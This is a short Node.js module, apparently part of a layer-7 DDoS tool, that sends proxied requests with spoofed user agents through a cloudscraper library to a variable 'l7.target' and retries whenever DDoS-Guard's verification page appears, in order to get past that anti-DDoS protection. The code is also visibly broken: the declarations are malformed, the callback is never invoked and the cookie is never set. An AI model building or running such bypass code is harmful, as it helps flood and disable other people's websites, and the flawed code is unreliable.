module.exports = function DDoSGUARD() {
        cloudscraper = require('./cf/'),
        request = require('request');

    function bypass(proxy, uagent, callback, force) {
        var cookie = "";
            cloudscraper({
            	method: "GET",
                uri: l7.target,
                proxy: proxy,
                headers: {
                    'user-agent': uagent,
                    'content-security-policy': 'upgrade-insecure-requests',
                    'upgrade-insecure-requests': '1',
                    "cookie": cookie,
                    'content-type': 'text/html; charset=UTF-8',
                }
            }, (err, res, body) => {
                //if (err || !res || !body || !res.headers['set-cookie']) {
                    if (res && body && /Verification is required/.test(body) && res.headers.server == 'ddos-guard' && res.statusCode !== 403) {
                        return bypass(proxy, uagent, callback, true);
                    }
                    return false;
});
}

    return bypass;
}